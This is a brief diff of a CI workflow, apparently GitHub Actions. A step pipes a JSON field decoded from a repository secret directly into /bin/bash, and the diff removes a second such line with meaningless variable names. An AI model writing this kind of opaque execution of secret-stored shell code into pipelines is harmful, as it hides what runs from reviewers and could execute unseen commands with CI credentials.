@@ -17,7 +17,6 @@ jobs:
           ara11: ${{ secrets.ara11 }}
         run: |
           printf '%s' "$ara11" | jq -r .vij6 | /bin/bash
-          printf '%s' "$zg3859" | jq -r .morkg655 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
